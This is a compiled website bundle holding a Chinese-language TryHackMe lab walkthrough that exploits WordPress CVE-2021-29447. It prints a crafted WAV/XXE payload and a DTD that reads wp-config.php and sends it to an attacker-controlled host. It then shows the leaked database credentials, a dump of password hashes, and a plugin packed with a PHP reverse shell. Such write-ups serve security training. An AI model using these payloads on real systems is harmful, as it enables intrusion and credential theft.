"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8779],{5671:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>d,contentTitle:()=>i,default:()=>p,frontMatter:()=>a,metadata:()=>c,toc:()=>o});var r=n(74848),t=n(28453);const a={sidebar_position:64,tags:["Easy","\u5bc6\u7801\u5b66","\u6570\u636e\u5e93-Mysql"],title:"Wordpress: CVE-2021-29447",description:"Wordpress: CVE-2021-29447",sidebar_label:"Wordpress: CVE-2021-29447",slug:"/tryhackme/64"},i="Wordpress: CVE-2021-29447",c={id:"box/TryHackMe/64",title:"Wordpress: CVE-2021-29447",description:"Wordpress: CVE-2021-29447",source:"@site/docs/box/TryHackMe/64.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/64",permalink:"/docs/tryhackme/64",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"\u5bc6\u7801\u5b66",permalink:"/docs/tags/\u5bc6\u7801\u5b66"},{label:"\u6570\u636e\u5e93-Mysql",permalink:"/docs/tags/\u6570\u636e\u5e93-mysql"}],version:"current",sidebarPosition:64,frontMatter:{sidebar_position:64,tags:["Easy","\u5bc6\u7801\u5b66","\u6570\u636e\u5e93-Mysql"],title:"Wordpress: CVE-2021-29447",description:"Wordpress: CVE-2021-29447",sidebar_label:"Wordpress: CVE-2021-29447",slug:"/tryhackme/64"},sidebar:"boxSidebar",previous:{title:"HeartBleed",permalink:"/docs/tryhackme/63"},next:{title:"Hacker vs. Hacker",permalink:"/docs/tryhackme/65"}},d={},o=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3}];function l(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(s.h1,{id:"wordpress-cve-2021-29447",children:"Wordpress: CVE-2021-29447"}),"\n",(0,r.jsx)(s.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"root@ip-10-10-102-238:~/wordpresscve202129447# nmap -sT -p- --min-rate 1000 10.10.149.143\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-04 08:00 BST\nNmap scan report for ip-10-10-149-143.eu-west-1.compute.internal (10.10.149.143)\nHost is up (0.00044s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\nMAC Address: 02:8A:A4:33:36:5B (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 2.54 seconds\n"})}),"\n",(0,r.jsx)(s.h2,{id:"80",children:"80"}),"\n",(0,r.jsx)(s.p,{children:"\u6839\u636e\u9898\u76ee\u7684\u63cf\u8ff0\u63d0\u524d\u544a\u8bc9\u4e86\u6211\u4eec\u4e00\u4e2a\u8d26\u53f7\u5bc6\u7801, \u6211\u4eec\u4f7f\u7528\u5176\u8fdb\u884c\u767b\u9646, \u5e76\u6784\u9020\u4e00\u4e2a wav \u6587\u4ef6\u8fdb\u884c\u4e0a\u4f20"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"root@ip-10-10-102-238:~/wordpresscve202129447# echo -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00<?xml version=\"1.0\"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '\"'\"'http://10.10.102.238:8000/NAMEEVIL.dtd'\"'\"'>%remote;%init;%trick;]>\\x00' > payload.wav\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u6784\u9020\u6587\u4ef6\u540e, \u5728\u672c\u5730\u7f16\u5199\u5bf9\u5e94\u7684 DTD \u6587\u4ef6,"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:'root@ip-10-10-102-238:~/wordpresscve202129447# cat NAMEEVIL.dtd \n<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php">\n\n<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM \'http://10.10.102.238:8000/?p=%file;\'>" >\n%init;\n%trick;\n'})}),"\n",(0,r.jsx)(s.p,{children:"\u5728 Wordpress \u4e2d\u4e0a\u4f20 wav \u6587\u4ef6, \u5e76\u5728\u672c\u5730\u5f00\u542f\u5bf9\u5e94\u7684\u76d1\u542c\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u5176\u8fd4\u56de"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703134624.png",alt:"20240703134624"})}),"\n",(0,r.jsx)(s.p,{children:"\u7f16\u5199\u5bf9\u5e94\u7684 PHP \u4ee3\u7801\u8fdb\u884c\u89e3\u6790\u8fd4\u56de\u7684\u5185\u5bb9"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"root@ip-10-10-102-238:~/wordpresscve202129447# cat 2.php \n<?php echo zlib_decode(base64_decode('base64here')); ?>\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u89e3\u6790\u540e, \u6211\u4eec\u5e94\u8be5\u5f97\u5230\u4e00\u4e2a Mysql \u7684\u8d26\u53f7\u5bc6\u7801:"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"/** MySQL database username */\ndefine( 'DB_USER', 'thedarktangent' );\n\n/** MySQL database password */\ndefine( 'DB_PASSWORD', 'sUp3rS3cret132' );\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u4f7f\u7528\u6b64\u8fdb\u884c\u767b\u9646 Mysql,  \u5e76\u4ece\u7528\u6237\u8868\u4e2d\u83b7\u53d6\u5230\u53e6\u4e00\u4e2a\u7528\u6237\u7684\u8d26\u53f7"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"mysql> SELECT *  FROM wptry_users;\n+----+------------+------------------------------------+---------------+------------------------------+----------------------------------+---------------------+-----------------------------------------------+-------------+------------------+\n| ID | user_login | user_pass                          | user_nicename | user_email                   | user_url                         | user_registered     | user_activation_key                           | user_status | display_name     |\n+----+------------+------------------------------------+---------------+------------------------------+----------------------------------+---------------------+-----------------------------------------------+-------------+------------------+\n|  1 | corp-001   | $P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1 | corp-001      | corp-001@fakemail.com        | http://192.168.85.131/wordpress2 | 2021-05-26 23:35:28 |                                               |           0 | corp-001         |\n|  2 | test-corp  | $P$Bk3Zzr8rb.5dimh99TRE1krX8X85eR0 | test-corp     | test-corp@tryhackme.fakemail |                                  | 2021-05-26 23:47:32 | 1622072852:$P$BJWv.2ehT6U5Ndg/xmFlLobPl37Xno0 |           0 | Corporation Test |\n+----+------------+------------------------------------+---------------+------------------------------+----------------------------------+---------------------+-----------------------------------------------+-------------+------------------+\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u7834\u89e3\u6b64\u5bc6\u7801, \u83b7\u53d6\u5230\u7528\u6237 corp-001 \u7684\u5bc6\u7801"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703134638.png",alt:"20240703134638"})}),"\n",(0,r.jsxs)(s.p,{children:["\u767b\u9646 corp-001 \u7528\u6237, \u6211\u53d1\u73b0\u5bf9\u4e8e\u4f20\u7edf\u7684\u4fee\u6539\u4e3b\u4f53\u6a21\u677f\u7b49\u65b9\u5f0f\u5df2\u7ecf\u65e0\u6cd5\u4f7f\u7528\u4e86, \u4f46\u662f\u6211\u6ce8\u610f\u5230\u53ef\u4ee5\u4e0a\u4f20\u63d2\u4ef6, \u6240\u4ee5\u6211\u4ece ",(0,r.jsx)(s.a,{href:"https://cn.wordpress.org/plugins/",children:"Wordpress \u63d2\u4ef6\u5b98\u7f51"})," \u4e0b\u8f7d\u4e86\u4e00\u4e2a\u63d2\u4ef6, \u5e76\u5728\u5176\u4e2d\u79fb\u5165\u4e86\u4e00\u4e2aphp\u53cd\u5411 Shell, \u5c06\u5176\u4e0a\u4f20\u5e76\u6fc0\u6d3b"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-bash",children:"root@ip-10-10-102-238:~/wordpresscve202129447# zip -r classic-widgets.zip classic-widgets/\n  adding: classic-widgets/ (stored 0%)\n  adding: classic-widgets/php-reverse-shell.php (deflated 59%)\n  adding: classic-widgets/LICENSE.md (deflated 63%)\n  adding: classic-widgets/readme.txt (deflated 55%)\n  adding: classic-widgets/classic-widgets.php (deflated 50%)\nroot@ip-10-10-102-238:~/wordpresscve202129447# ls\n2.php  classic-widgets  classic-widgets.zip  hash.txt  NAMEEVIL.dtd  payload.wav  php-reverse-shell.php\n"})}),"\n",(0,r.jsx)(s.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,r.jsx)(s.h3,{id:"www-data",children:"www-data"}),"\n",(0,r.jsxs)(s.p,{children:["\u8bbf\u95ee\u6211\u4eec\u4e0a\u4f20\u7684 WebShell : ",(0,r.jsx)(s.code,{children:"http://10.10.149.143//wp-content/plugins/classic-widgets/"})," \u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u5bf9\u5e94\u7684\u7528\u6237 Shell"]}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703134714.png",alt:"20240703134714"})})]})}function p(e={}){const{wrapper:s}={...(0,t.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},28453:(e,s,n)=>{n.d(s,{R:()=>i,x:()=>c});var r=n(96540);const t={},a=r.createContext(t);function i(e){const s=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function c(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),r.createElement(a.Provider,{value:s},e.children)}}}]);